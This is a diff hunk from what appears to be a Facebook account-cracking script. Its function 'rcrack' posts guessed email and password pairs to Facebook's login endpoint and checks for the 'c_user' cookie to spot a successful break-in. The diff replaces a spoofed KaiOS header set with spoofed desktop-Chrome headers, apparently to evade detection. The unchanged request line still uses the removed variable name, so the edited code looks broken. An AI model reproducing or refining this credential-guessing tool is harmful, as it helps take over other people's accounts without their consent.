@@ -235,21 +235,25 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {    'authority': 'mbasic.facebook.com',
-       "method": 'GET',
-       "scheme": 'https',
-       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-       'accept-language': 'en-US,en;q=0.9,ur-IN;q=0.8,ur;q=0.7',
-       'cache-control': 'max-age=0',
-       'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-       'sec-ch-ua-mobile': '?1',
-       'sec-ch-ua-platform': '"Android"',
-       'sec-fetch-dest': 'document',
-       'sec-fetch-mode': 'navigate',
-       'sec-fetch-site': 'none',
-       'sec-fetch-user': '?1',
-       'upgrade-insecure-requests': '1',
-      'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            headers = {
+    'authority': 'free.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+    'viewport-width': '980',
+}
             lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
